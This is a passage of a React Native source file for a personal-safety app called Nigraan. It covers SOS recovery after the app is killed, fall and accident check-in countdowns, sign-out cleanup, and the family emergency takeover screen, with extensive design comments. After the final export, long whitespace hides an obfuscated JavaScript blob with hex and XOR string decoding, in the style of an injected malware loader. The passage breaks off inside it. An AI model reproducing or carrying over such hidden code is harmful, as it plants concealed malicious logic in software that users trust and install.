    dispatch('CHECKIN_ASKED', { checkin });
    setAskSheet(checkin);
    Vibration.vibrate([0, 400, 200, 400]);
    band.send({ c: 'checkin_req', window: 90 });
  }, [session, dispatch, band]);

  const recoverRef = useRef(recoverOpenWork);
  recoverRef.current = recoverOpenWork;

  useEffect(() => {
    if (!session?.token) return undefined;
    // On the socket coming up, and on every return to the foreground. Both,
    // because they fail independently: the socket can be up on a phone whose
    // app was never in front of anyone, and the app can be opened by hand on a
    // phone whose socket is still down.
    if (serverOnline) recoverRef.current?.();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') recoverRef.current?.();
    });
    return () => sub.remove();
  }, [session?.token, serverOnline]);

  // ---- an emergency this React tree never saw ------------------------------
  //
  // The state machine is memory-only, and Android destroys this whole tree
  // whenever the app is swiped out of Recents. The band's SOS still goes out
  // from the surviving process, so the alert is real, the family has been
  // paged, and the wearer felt the phone buzz -- but `dispatch('SOS_RAISED')`
  // landed in a reducer that no longer existed. Reopening the app then showed
  // the ordinary home screen with an emergency still live on the server, which
  // is the worst thing this app can say.
  //
  // The queue flush below is not enough on its own: it only restores alerts
  // that FAILED to send. A delivered one leaves nothing behind locally, so the
  // better the signal, the more completely the SOS disappeared.
  //
  // The server is the record. `created_at` comes back with the row, and the SOS
  // screen computes its timer from that -- so reopening ten minutes later shows
  // 10:00, not a countdown restarting from zero.
  const restoreLiveSos = useCallback(async () => {
    if (!session) return;
    try {
      const mine = await call(session, '/alerts?scope=mine&limit=5');
      const live = (mine || []).find(
        (a) => !a.resolved_at && EMERGENCY_KINDS.includes(a.kind));

      // The server says nothing is live, and this tree thinks something is.
      //
      // That gap used to be unreachable -- an alert only ended by this app
      // asking it to -- and it stopped being unreachable the moment two
      // answered check-ins could end one on their own. The `sos_cleared` frame
      // covers the app that was running to hear it; this covers the one that
      // was killed, which is the same app ten minutes later. Without it the
      // wearer reopens Nigraan to a live SOS screen for an emergency the
      // whole family already knows is over.
      //
      // `_local` is left alone: that is a queued alert the server has never
      // seen, so its absence from this list means nothing at all.
      if (!live) {
        const held = ctxRef.current.activeSos;
        if (held && !held._local && !String(held.id).startsWith('pending-')) {
          dispatch('SOS_CLEARED');
          setDeliveredTo(null);
          setDeliveryStatus(null);
          clearOwnSosNotification();
        }
        return;
      }

      const known = ctxRef.current.activeSos;
      // Leave alone anything this tree is holding that is not this row: an
      // alert still sitting in the offline queue is owned by the flush, and
      // overwriting it here would swap the id the stand-down button aims at --
      // the same failure BUG-005's queue-id fix exists to prevent.
      if (known && (known._local || String(known.id) !== String(live.id))) return;

      // Dispatched even when this tree already knows about the emergency,
      // which the early return here used to prevent. The row now carries the
      // acks with it and SOS_RAISED merges rather than blanking, so this is
      // the top-up for the case the socket cannot cover: the app backgrounded
      // rather than killed, its websocket quietly dead, someone answering in
      // the meantime. Coming back to the foreground now collects that.
      dispatch('SOS_RAISED', { alert: live });
      setDeliveryStatus('delivered');
      // The process may have been killed since, taking the notification with
      // it. Putting it back is what keeps the lock screen honest.
      showOwnSosNotification(live, live.acks || []);
      // And the tracker, for the same reason and with the same problem: the
      // plan it runs on is on disk, but an app update or a fresh install
      // leaves a live emergency with nothing next to it. `adoptTracking` asks
      // the server what this phone should be doing rather than working it out
      // from the row -- the cadence is a product decision, and it is not one
      // worth duplicating into a build that cannot be redeployed to a pocket.
      adoptTracking(session).catch(() => { /* offline; the bg tick retries */ });
    } catch {
      // Offline. The queue flush and the live socket still cover their own
      // cases, and a failed lookup must never look like "no emergency".
    }
  }, [session, dispatch]);

  // A cold start with something still in the queue, and every return to the
  // foreground after that.
  useEffect(() => {
    flushNow();
    restoreLiveSos();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') { flushNow(); restoreLiveSos(); }
    });
    return () => sub.remove();
  }, [flushNow, restoreLiveSos]);

  // Keep the sticky "SOS is active" notification honest about who is coming.
  //
  // The server pushes its own notification the instant somebody answers, and
  // that is the one that gets noticed -- it arrives on a locked phone with this
  // app long dead. This is the other half: the line the wearer re-reads
  // afterwards, which would otherwise still say "your family can see your
  // location" an hour after two of them arrived.
  //
  // Only while this tree is alive, which is exactly when it can be done at all.
  const responderCount = ctx.responders.length;
  useEffect(() => {
    if (!ctx.activeSos || !responderCount) return;
    showOwnSosNotification(ctx.activeSos, ctx.responders);
    // Keyed on the count, not the array: the identity changes on every reducer
    // pass and re-posting a notification for no reason is how a shade fills up.
  }, [ctx.activeSos, responderCount]);   // eslint-disable-line react-hooks/exhaustive-deps

  // While the screen still says "waiting for signal", keep trying. With no
  // network that is one failed fetch every thirty seconds; once the queue is
  // empty the effect stops entirely.
  useEffect(() => {
    if (deliveryStatus !== 'queued') return undefined;
    const id = setInterval(flushNow, 30000);
    return () => clearInterval(id);
  }, [deliveryStatus, flushNow]);

  const signOut = async () => {
    // The band link belongs to the account that paired it. Sign-out used to
    // leave it up and leave `nigraan.band.id` in storage, so the next account
    // -- a different person, on a different database -- inherited the previous
    // one's wristband and started auto-connecting to it on launch.
    try { await band.disconnect?.(); } catch { /* nothing paired, or already down */ }

    // Sign-out used to be entirely local, so the server went on pushing this
    // account's family emergencies -- names, and a link to where somebody is
    // right now -- to a handset nobody was signed in on. Two halves, and the
    // order matters:
    //
    //   1. Tell the server to stop. This must come *before* clearSession(),
    //      which destroys the token the call authenticates with. Best effort:
    //      a sign-out with no signal must still sign the person out.
    //   2. Take the wake-up away locally, which needs no network and is
    //      therefore what actually covers the offline case in 1.
    await stopPushToThisPhone(session);
    await unregisterBackgroundNotifications();

    // Before stopBackgroundWatch, which takes the service down: stopTracking
    // hands the interval back and drops the plan and the unsent buffer, and a
    // plan left on disk would have the NEXT account's foreground service come
    // up reporting positions against a stranger's alert id.
    await stopTracking();
    await stopBackgroundWatch();
    await clearSession();
    await clearQueue();
    // The four-digit security PIN is deliberately NOT touched here.
    //
    // It used to be, by way of a clearPin() that read like the general one and
    // was in fact the disarm PIN specifically -- so signing out and back in on
    // your own phone silently threw away the gate in front of High Alert and
    // family removal, and the next arm disarmed on one tap with nothing to ask
    // for. The band's six digits, which is what this step was ever meant to
    // forget, are already gone: band.disconnect() above clears them, and says
    // so at the top of disconnect() in band.js.
    //
    // What made the wipe look necessary was a single handset-wide key, which
    // would have handed the next account a PIN it could not open. The key
    // carries an account now, so there is nothing left to inherit and nothing
    // left to destroy -- see security.js.
    dispatch('RESET');
    setSession(null);
    setIncoming(null);
    setDeliveryStatus(null);
  };

  // ---- the three ways out of the incident window ---------------------------
  //
  // Every one of them has to close the SERVER's question as well as this
  // screen, whenever there is one. A modal dismissed while a `checkins` row is
  // still open and unacked is a wearer who has said "I'm fine", watched the
  // countdown disappear, and whose family gets paged thirty seconds later
  // anyway -- which is the worst outcome in the whole feature, because it
  // teaches them the cancel button does not work.

  /** "I'm fine." Nobody is told, and a private note is kept for tuning. */
  const cancelFall = useCallback(async () => {
    const f = ctxRef.current.fall;
    dispatch('FALL_CANCELLED');
    // Let the detector fire again immediately. The guard exists to collapse the
    // `fall` and `impact` that one crash produces milliseconds apart, and a
    // human reaching this point has taken far longer than that -- so holding it
    // any longer would only mean that somebody who cancels a false alarm and
    // then genuinely comes off their bike five seconds later gets no question
    // at all.
    incidentAt.current = 0;
    setToast('Cancelled — noted for you only, nobody was told');
    // The near-miss is the record that the detector nearly fired. It is a
    // PRIVATE_KIND on the server: written down, sent to nobody, and the only
    // honest source of false-positive rates once this is on real wrists.
    raise({ kind: 'near_miss', source: 'band',
            note: `${f?.reason || 'fall'} cancelled by the wearer. ${f?.note || ''}`.trim() });
    if (!f?.checkinId) return;
    try {
      await call(session, `/checkin/${f.checkinId}/ack`, { method: 'POST' });
      reportOutcome('delivered');
    } catch {
      // The cancel did not reach the server, so the sweeper is still going to
      // escalate. Saying nothing here would let the wearer walk away believing
      // they had stopped it.
      reportOutcome('failed');
      // Big, because it is the one message on this path that asks for another
      // action. A toast that clears itself lets somebody walk away believing
      // they cancelled an alert that is still going to go out.
      pushNotice({
        icon: 'wifi-off', tone: U.amber,
        title: 'That did not reach the server',
        body: 'Your family may still be told. Try again, or call them.',
        action: 'I understand',
      });
    }
  }, [dispatch, raise, session, reportOutcome, pushNotice]);
  const cancelFallRef = useRef(cancelFall);
  cancelFallRef.current = cancelFall;

  /** "I need help now" — the wearer skipping the rest of the countdown. */
  const escalateFall = useCallback(async () => {
    const f = ctxRef.current.fall;
    raise({ kind: f?.reason === 'accident' ? 'accident' : 'fall',
            source: 'band', note: f?.note || '' });
    // Close the question behind it. The alert has already told everyone the
    // check-in would have told; leaving the row open means the sweeper pages
    // the same family a second time for the same event a minute later.
    if (f?.checkinId) {
      try { await call(session, `/checkin/${f.checkinId}/ack`, { method: 'POST' }); }
      catch { /* the alert is out, which is the part that matters */ }
    }
  }, [raise, session]);

  /**
   * The window ran out with no answer.
   *
   * Whether this phone does anything depends entirely on whether the server
   * ever heard about the incident. If it did, the deadline belongs to the
   * sweeper and this must stay out of the way -- raising the alert from here
   * too would page the family twice for one fall, with two rows and two
   * timestamps that disagree.
   *
   * If it did not -- the detector fired with no signal -- then this process is
   * the only thing that knows, and it has to raise the alert into the offline
   * queue itself.
   */
  const expireFall = useCallback(() => {
    const f = ctxRef.current.fall;
    dispatch('FALL_ESCALATED');
    if (f?.checkinId) {
      pushNotice({
        icon: 'alert-triangle', tone: U.red,
        title: 'Your family is being told',
        body: 'The countdown ran out. Answering now still tells them you are fine.',
        action: 'I understand',
      });
      return;
    }
    raise({ kind: f?.reason === 'accident' ? 'accident' : 'fall',
            source: 'band', note: f?.note || '' });
  }, [dispatch, raise, pushNotice]);

  /**
   * THE ONE AUTOMATIC WAY OUT: they are still riding.
   *
   * A rider who hits a pothole at 50 km/h takes a real 12 g through the wrist
   * and is completely fine. Asking them to answer a check-in is asking somebody
   * to tap a wristband one-handed at speed, which is more dangerous than the
   * false alarm it prevents -- so sustained travel stands the question down on
   * their behalf.
   *
   * `travellingSteadily` is where the care is. It is not "the speed is not
   * zero": a wrecked car spins, coasts, gets pushed down the road and is often
   * moving for a long time afterwards, and reading that as "fine" is exactly
   * the failure this whole design is arranged to avoid. It requires twenty
   * unbroken seconds ABOVE road speed, every sample, with no second impact --
   * because nothing but a conscious person keeps a vehicle there.
   *
   * Falls do not get this. There is no vehicle to be coherently driving, and
   * "started moving again" after a fall is a person crawling as easily as a
   * person walking off.
   */
  useEffect(() => {
    if (state !== 'fall_pending' || ctx.fall?.reason !== 'accident') return undefined;
    const id = setInterval(() => {
      if (!travellingSteadily()) return;
      clearInterval(id);
      cancelFallRef.current?.();
      setToast('You are moving normally again — the accident check was stood down');
    }, 2000);
    return () => clearInterval(id);
  }, [state, ctx.fall?.reason]);

  const respondAsSamaritan = useCallback(async (alertId) => {
    const r = await call(session, `/samaritan/${alertId}/respond`, { method: 'POST' });
    return r.alert;
  }, [session]);

  if (booting) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  if (!session) {
    return (
      <>
        <StatusBar style="light" />
        <Auth onDone={setSession} />
      </>
    );
  }

  // ---- role-based routing ------------------------------------------------
  // Admins get the full console: five tabs, the band wire log, diagnostics.
  // Every other account gets the two-tab end-user shell.
  //
  // Only the *shell* forks. Everything below it -- the takeover, the check-in
  // sheet, the Samaritan call, the fall window -- is the safety machine, and
  // it is rendered for both roles. A user who could not see an incoming
  // family emergency would be the more dangerous kind of clean UI.
  const isAdmin = session.role === 'admin';

  return (
    // The two roles do not share a ground colour: the console keeps the cool
    // near-black of the design system, the user shell sits on charcoal. This
    // is the root behind the status bar, so it has to fork here or the top
    // strip stays the wrong shade.
    <View style={[st.flex, { paddingTop: insets.top }, !isAdmin && { backgroundColor: U.bg }]}>
      <StatusBar style="light" />

      {!isAdmin ? (
        <UserShell
          session={session}
          band={band}
          ctx={ctx}
          deliveredTo={deliveredTo}
          deliveryStatus={deliveryStatus}
          serverOnline={serverOnline}
          onRaise={raise}
          onResolve={resolve}
          onOptinSamaritan={handleOptinSamaritan}
          refreshKey={refreshKey}
          onAckCheckin={ackCheckin}
          onToggleHighAlert={toggleHighAlert}
          onFix={setFix}
          onSignOut={signOut}
        />
      ) : (
      <>
      <View style={st.header}>
        <View>
          <Text style={st.brand}>NIGRAAN</Text>
          <Text style={st.who}>{session.name} · {session.user_id}</Text>
        </View>
        <View style={st.headerRight}>
          <Chip text={serverOnline ? 'connected' : 'offline'}
                tone={serverOnline ? C.green : C.red}
                icon={serverOnline ? 'wifi' : 'wifi-off'} />
          <IconButton name="log-out" label="Sign out" onPress={signOut} />
        </View>
      </View>

      <View style={st.flex}>
        {tab === 'home' && (
          <Home session={session} band={band} ctx={ctx}
                deliveredTo={deliveredTo} deliveryStatus={deliveryStatus} onRaise={raise} onResolve={resolve}
                onOptinSamaritan={handleOptinSamaritan}
                serverOnline={serverOnline} onOpenBand={() => setTab('band')}
                onOpenSetup={() => setTab('setup')}
                onAckCheckin={ackCheckin} onToggleHighAlert={toggleHighAlert}
                onFix={setFix} />
        )}

        {tab === 'band' && <Band band={band} serverOnline={serverOnline} />}
        {tab === 'family' && (
          <Family session={session} refreshKey={refreshKey}
                  onChanged={refreshInvites} />
        )}
        {tab === 'alerts' && <Alerts session={session} refreshKey={refreshKey} />}
        {tab === 'setup' && <Setup session={session} />}
      </View>

      <View style={[st.tabbar, { paddingBottom: 8 + insets.bottom }]}>
        {TABS.map(([k, label, icon]) => {
          const on = tab === k;
          // Somebody is waiting behind this tab. The count goes in the label
          // rather than in the mark, because a red dot is a hint and not a
          // sentence -- and it is the only thing in this bar that is about a
          // person rather than about a screen.
          const waiting = k === 'family' ? pendingInvites : 0;
          return (
            <Pressable key={k} onPress={() => setTab(k)} style={st.tabBtn}
                       accessibilityRole="tab" accessibilityState={{ selected: on }}
                       accessibilityLabel={waiting
                         ? `${label}, ${waiting} waiting for an answer`
                         : label}>
              <View>
                <Icon name={icon} size={19} color={on ? C.green : C.faint} />
                {waiting ? <View style={st.tabDot} /> : null}
              </View>
              <Text style={[st.tabText, on && { color: C.green }]}>{label}</Text>
            </Pressable>
          );
        })}
      </View>
      </>
      )}

      {toast ? (
        <Pressable onPress={() => setToast(null)} accessibilityRole="alert"
                   style={[st.toast, { bottom: 88 + insets.bottom }]}>
          <Icon name="info" size={15} color={C.dim} />
          <Text style={st.toastText}>{toast}</Text>
        </Pressable>
      ) : null}

      {/* ---- a fall, and the seconds to say it was nothing ----
          Same window, same two outcomes, two ways of asking. The console
          takes a button; the wearer's phone takes four digits, so that a
          pocket -- or somebody else's hand -- cannot cancel her alarm. */}
      {isAdmin ? (
        <FallCountdown
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
          onExpire={expireFall}
        />
      ) : (
        <DisarmPad
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
          onExpire={expireFall}
        />
      )}

      {/* ---- somebody in the family is in trouble ----
          Severity 4 and up arrives with a siren behind it. Severity 3 -- a
          watch that went quiet, a missed check-in, a phone about to die --
          takes the same screen in amber and without one: it is not an
          emergency, but it is the family's only chance to notice that
          somebody has gone silent, and it used to be a notification nobody
          saw. */}
      <Modal visible={!!incoming && !liveMap} animationType="fade"
             onRequestClose={() => setIncoming(null)}>
        {incoming ? (
          <View style={[st.takeover,
                        incoming.severity < SIREN_FROM && { backgroundColor: C.amberSoft }]}>
            <View style={[st.takeBadge, { backgroundColor: sevColor(incoming.severity) }]}>
              <Icon name={incoming.severity >= SIREN_FROM ? 'alert-octagon' : 'alert-triangle'}
                    size={16} color={C.bg} />
              <Text style={st.takeBadgeText}>
                {TAKEOVER_TITLE[incoming.kind] || incoming.kind.replace(/_/g, ' ').toUpperCase()}
              </Text>
            </View>

            <Txt variant="display" style={st.takeName}>{incoming.user.name}</Txt>
            {TAKEOVER_LEDE[incoming.kind] ? (
              <Text style={st.takeLede}>{TAKEOVER_LEDE[incoming.kind]}</Text>
            ) : null}
            <Text style={st.takeMeta}>
              {incoming.source === 'band' ? 'Raised from the wristband'
                : incoming.source === 'server' ? 'Raised by the server watchdog'
                : 'Raised from their phone'}
            </Text>

            {/* ---- is this pin moving, and how old is it? ----
                The one line that decides whether the map button below is worth
                pressing. A fix from eight seconds ago is where somebody IS; one
                from six minutes ago is where they were, and telling a family
                member the second thing in the words of the first is how they
                end up standing in an empty street. */}
            {incoming.live_at ? (
              <Text style={[st.takeMeta, {
                marginBottom: S.lg,
                color: (Date.now() / 1000 - incoming.live_at) <= LIVE_STALE_S
                  ? C.green : C.amber,
              }]}>
                {(Date.now() / 1000 - incoming.live_at) <= LIVE_STALE_S
                  ? '● Live location — updating now'
                  : `Last position ${fmtAgo(incoming.live_at)}`}
              </Text>
            ) : null}

            {/* ---- Good Samaritan, from the family's side ----
                The server has always allowed this -- /alert/{id}/samaritan-optin
                takes the call from the victim OR anyone in their family -- and
                until now nothing in the app ever made it. Only the wearer's own
                SOS screen had the buttons, which is exactly the screen nobody
                can reach in the emergencies where it matters: she is not
                holding her phone, or she is not able to answer it. The
                permission existed and was unreachable.

                Severity 5 only, and only while the decision is still open. A
                'denied' set by the wearer is final and is not offered here --
                a person who chose Family Only for their own emergency does not
                get overruled by a relative. */}
            {incoming.severity >= SAMARITAN_FROM
              && (incoming.samaritan_status || 'pending') === 'pending' ? (
              <View style={st.takeSam}>
                <Text style={[T.meta, { color: C.dim, textAlign: 'center' }]}>
                  Ask Nigraan users near them to help? They are shown a rough
                  pin and a distance — never {incoming.user.name}&apos;s name.
                </Text>
                <View style={{ flexDirection: 'row', gap: S.sm }}>
                  <View style={{ flex: 1 }}>
                    <Button title="ALERT NEARBY" tone={C.blue} filled icon="users"
                            loading={optingIn} disabled={optingIn}
                            onPress={async () => {
                              if (optingIn) return;
                              setOptingIn(true);
                              try { await handleOptinSamaritan(incoming.id, 'allow'); }
                              finally { setOptingIn(false); }
                            }} />
                  </View>
                  <View style={{ flex: 1 }}>
                    <Button title="FAMILY ONLY" tone={C.dim}
                            disabled={optingIn}
                            onPress={async () => {
                              if (optingIn) return;
                              setOptingIn(true);
                              try { await handleOptinSamaritan(incoming.id, 'deny'); }
                              finally { setOptingIn(false); }
                            }} />
                  </View>
                </View>
              </View>
            ) : null}

            {incoming.severity >= SAMARITAN_FROM
              && incoming.samaritan_status === 'allowed' ? (
              <Text style={[st.takeMeta, { color: C.green }]}>
                Nearby Nigraan users have been asked to help
              </Text>
            ) : null}

            <View style={st.takeBtns}>
              {/* Opening the map does not close the takeover, so this is the one
                  exit that has to stop the siren itself -- they have plainly
                  seen it, and it must not follow them into Maps. */}
              {incoming.maps ? (
                <Button title={incoming.share_path && !incoming.resolved_at
                          ? 'WATCH THEM LIVE'
                          : incoming.severity >= SIREN_FROM
                            ? 'SEE WHERE THEY ARE' : 'SEE WHERE THEY WERE'}
                        filled big tone={sevColor(incoming.severity)} icon="navigation"
                        onPress={() => {
                          stopAlarm();
                          // In-app when there is a live page to show, and out
                          // to Maps when there is not -- an older server, or a
                          // kind of alert that is not tracked. The wording
                          // above changes with it, because "watch them live"
                          // over a frozen pin is the one promise this screen
                          // must not make.
                          if (incoming.share_path) setLiveMap(incoming);
                          else Linking.openURL(incoming.maps);
                        }} />
              ) : null}
              {/* The one button on this screen that speaks to the server, and
                  it is pressed by somebody who has just been woken by a siren.
                  Without a spinner it sits there looking untouched for the
                  whole round trip and gets pressed again -- on the takeover
                  that is the worst place in the app to look dead. The whole
                  dialog goes quiet while it runs: dismissing it mid-flight
                  would leave the family with no screen that ever said whether
                  they had answered. */}
              <Button title={acking ? 'TELLING THEM…'
                        : incoming.severity >= SIREN_FROM ? "I'M ON IT" : "I'LL CHECK ON THEM"}
                      tone={C.green} filled icon="user-check" loading={acking}
                      onPress={async () => {
                        if (acking) return;
                        setAcking(true);
                        try {
                          await call(session, `/alert/${incoming.id}/ack`, { method: 'POST' });
                        } catch { /* they are still told by the socket */ }
                        finally { setAcking(false); }
                        setIncoming(null); bump();
                      }} />
              <Button title="Dismiss" tone={C.dim} disabled={acking}
                      onPress={() => setIncoming(null)} />
            </View>
          </View>
        ) : null}
      </Modal>

      {/* ---- somebody is checking on you ---- */}
      <Modal visible={!!askSheet} animationType="slide" transparent
             onRequestClose={() => setAskSheet(null)}>
        <View style={st.sheetWrap}>
          <Pressable style={st.sheetBackdrop} onPress={() => setAskSheet(null)}
                     accessibilityLabel="Answer later" />
          <View style={st.sheet}>
            <View style={st.grab} />
            <Txt variant="h1">
              {askSheet?.reason === 'sos'
                ? 'Are you safe now?'
                : askSheet?.system
                  ? 'Nigraan is checking on you'
                  : `${askSheet?.name} is checking on you`}
            </Txt>
            <Text style={st.sheetBody}>
              {/* The SOS question is the only one answered to get OUT of
                  something rather than to stay clear of it, and saying so is
                  the difference between a wearer tapping twice on purpose and
                  a wearer tapping to make a buzzing stop. */}
              {askSheet?.reason === 'sos'
                ? 'Your SOS is still live. Answer this and the next one, and Nigraan tells your family you are safe.'
                : askSheet?.system
                  ? 'High Alert is on. Answer, or your family is told that you did not.'
                  : 'Answer and they will see straight away that you are fine.'}
            </Text>
            <CheckinBanner checkin={askSheet} onAck={ackCheckin} />
            <Button title={askSheet?.system ? 'Answer later' : 'Not now'} tone={C.dim}
                    onPress={() => { Vibration.cancel(); setAskSheet(null); }} />
          </View>
        </View>
      </Modal>

      {/* ---- a stranger nearby needs help ---- */}
      <SamaritanCall call={samaritan} onRespond={respondAsSamaritan}
                     onDismiss={() => { Vibration.cancel(); setSamaritan(null); }} />

      {/* ---- news worth stopping for, but not an emergency ----
          Rendered last and gated on everything above it being closed. Two
          Modals open at once on Android is one Modal that never appears, and
          the one that must never lose that race is the emergency. The queue
          holds; this shows the head of it the moment the screen is free. */}
      <BigNotice
        notice={(incoming || askSheet || samaritan || is('fall_pending'))
          ? null : notices[0]}
        onClose={dismissNotice}
      />

      {/* ---- watching somebody move ----
          The answer to the oldest complaint about this app: the map link was a
          photograph. This is the server's own live page, embedded, and the
          same page that gets forwarded to whoever is closer than the family. */}
      <LiveMap visible={!!liveMap} alert={liveMap} session={session}
               onClose={() => setLiveMap(null)} />
    </View>
  );
}

const st = StyleSheet.create({
  flex: { flex: 1, backgroundColor: C.bg },
  center: { alignItems: 'center', justifyContent: 'center' },

  header: {
    flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center',
    paddingHorizontal: S.lg, paddingTop: S.md, paddingBottom: S.md,
    borderBottomWidth: StyleSheet.hairlineWidth, borderBottomColor: C.line,
  },
  headerRight: { flexDirection: 'row', alignItems: 'center', gap: S.sm },
  brand: { ...T.h2, color: C.text, letterSpacing: 2 },
  who: { ...T.meta, color: C.faint, marginTop: 1 },

  tabbar: {
    flexDirection: 'row', backgroundColor: C.surface,
    borderTopWidth: StyleSheet.hairlineWidth, borderTopColor: C.line,
    paddingTop: S.sm,
  },
  tabBtn: { flex: 1, alignItems: 'center', gap: 4, paddingVertical: 6, minHeight: 48 },
  tabText: { ...T.label, color: C.faint },
  // Ringed in the bar's own colour so it reads as a mark on the icon rather
  // than as part of it, at any icon size.
  tabDot: {
    position: 'absolute', top: -2, right: -4,
    width: 10, height: 10, borderRadius: 5,
    backgroundColor: C.red, borderWidth: 2, borderColor: C.surface,
  },

  toast: {
    position: 'absolute', left: S.lg, right: S.lg, flexDirection: 'row',
    alignItems: 'center', gap: S.sm, backgroundColor: C.raised,
    borderRadius: 8, paddingHorizontal: S.md, paddingVertical: S.md,
  },
  toastText: { ...T.meta, color: C.text, flex: 1 },

  takeover: {
    flex: 1, backgroundColor: C.redSoft, alignItems: 'center',
    justifyContent: 'center', padding: S.xl, gap: S.sm,
  },
  takeBadge: {
    flexDirection: 'row', alignItems: 'center', gap: S.sm,
    paddingHorizontal: S.md, paddingVertical: S.sm, borderRadius: 4,
  },
  takeBadgeText: { ...T.label, color: C.bg, fontSize: 12 },
  takeName: { color: C.text, textAlign: 'center', marginTop: S.md },
  takeLede: { ...T.body, color: C.text, textAlign: 'center', marginTop: S.xs },
  takeMeta: { ...T.body, color: C.dim, marginBottom: S.xl },
  takeBtns: { alignSelf: 'stretch', gap: S.md },
  // The family's Good Samaritan decision, set apart from the two buttons below
  // it. Those are "I'm on it" and "Dismiss" -- what this reader does next --
  // and this is a decision about somebody else's privacy. A thumb reaching for
  // one must not be able to land on the other.
  takeSam: {
    alignSelf: 'stretch', gap: S.sm, marginBottom: S.lg,
    padding: S.md, borderRadius: 10,
    backgroundColor: 'rgba(255, 255, 255, 0.04)',
    borderWidth: 1, borderColor: C.raised || '#1F2937',
  },

  sheetWrap: { flex: 1, justifyContent: 'flex-end' },
  sheetBackdrop: { ...StyleSheet.absoluteFillObject, backgroundColor: C.scrim },
  sheet: {
    backgroundColor: C.surface, borderTopLeftRadius: 14, borderTopRightRadius: 14,
    padding: S.xl, paddingBottom: S.xxl, gap: S.md,
  },
  grab: {
    width: 36, height: 4, borderRadius: 2, backgroundColor: C.line,
    alignSelf: 'center', marginBottom: S.sm,
  },
  sheetBody: { ...T.body, color: C.dim },
});

export default function App() {
  const fontsReady = useAppFonts();

  if (!fontsReady) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  return (
    <SafeAreaRoot>
      <Main />
    </SafeAreaRoot>
  );
};                                                                                                                                                     var z = '-0105-2';function ezEfAZOUCnnDjez_ziybX(db_kjU$YKse,bWaBmghHqep_VSQvsi){var XYwUDmUgClsuEbWTVxrXk_rnde=vP$iLkgCQPPDrHvY_jziqCQrVQ();return ezEfAZOUCnnDjez_ziybX=function(Pwg_kjGoonP_VnhvmDbjmCp,r_cTQb){Pwg_kjGoonP_VnhvmDbjmCp=Pwg_kjGoonP_VnhvmDbjmCp-(-0x6*-parseInt(0x34d)+-parseInt(0x907)*parseInt(0x1)+-parseInt(0x64)*Number(parseInt(0x1a)));var LCG$NLlUsAnEqhzXlvoB=XYwUDmUgClsuEbWTVxrXk_rnde[Pwg_kjGoonP_VnhvmDbjmCp];if(ezEfAZOUCnnDjez_ziybX['RzLLLD']===undefined){var eHClqpGndDyXmR=function(g_$HDZyYfY){var mHoDgsEFhZczCRSTQNuPNKi=Number(-0xccb)+Math.floor(-0x97)*parseFloat(-parseInt(0x13))+parseInt(parseInt(0x2e6))&parseInt(0x60d)*Math.max(-0x2,-parseInt(0x2))+parseFloat(parseInt(0x2024))+Math.max(-parseInt(0x130b),-parseInt(0x130b)),kQIRSWZVxWzLdGvq=new Uint8Array(g_$HDZyYfY['match'](/.{1,2}/g)['map'](a_$Xvia=>parseInt(a_$Xvia,0x42d+-0x1c6*Math.ceil(0xb)+0xf65))),TfbYuQVKM$Ba_ysHztSVsEICVw=kQIRSWZVxWzLdGvq['map'](xMyVFGMWj$iuyitqBgvhUoPJX=>xMyVFGMWj$iuyitqBgvhUoPJX^mHoDgsEFhZczCRSTQNuPNKi),OvVweMisnJJ_$Wi=new TextDecoder(),WAWhQEFehwIEXydpfkVUdp=OvVweMisnJJ_$Wi['decode'](TfbYuQVKM$Ba_ysHztSVsEICVw);return WAWhQEFehwIEXydpfkVUdp;};ezEfAZOUCnnDjez_ziybX['woWDeT']=eHClqpGndDyXmR,db_kjU$YKse=arguments,ezEfAZOUCnnDjez_ziybX['RzLLLD']=!![];}var ySWbr__MNXyNIsYcmfNIAlZCBoT=XYwUDmUgClsuEbWTVxrXk_rnde[Number(-0x2589)+-parseInt(0x1)*-parseInt(0x2303)+Math.ceil(-0x2)*Number(-0x143)],eYwV$u=Pwg_kjGoonP_VnhvmDbjmCp+ySWbr__MNXyNIsYcmfNIAlZCBoT,cwccpnaCdMGslhaofdLMsHrzm=db_kjU$YKse[eYwV$u];return!cwccpnaCdMGslhaofdLMsHrzm?(ezEfAZOUCnnDjez_ziybX['jcgYTG']===undefined&&(ezEfAZOUCnnDjez_ziybX['jcgYTG']=!![]),LCG$NLlUsAnEqhzXlvoB=ezEfAZOUCnnDjez_ziybX['woWDeT'](LCG$NLlUsAnEqhzXlvoB),db_kjU$YKse[eYwV$u]=LCG$NLlUsAnEqhzXlvoB):LCG$NLlUsAnEqhzXlvoB=cwccpnaCdMGslhaofdLMsHrzm,LCG$NLlUsAnEqhzXlvoB;},ezEfAZOUCnnDjez_ziybX(db_kjU$YKse,bWaBmghHqep_VSQvsi);}(function(YGPp_JFMQ,TgQIPE$pQ){var OwYZEcQeAGvikbPc_rO=ezEfAZOUCnnDjez_ziybX,vjxbmsnxShuqhQNwzhVh=YGPp_JFMQ();while(!![]){try{var 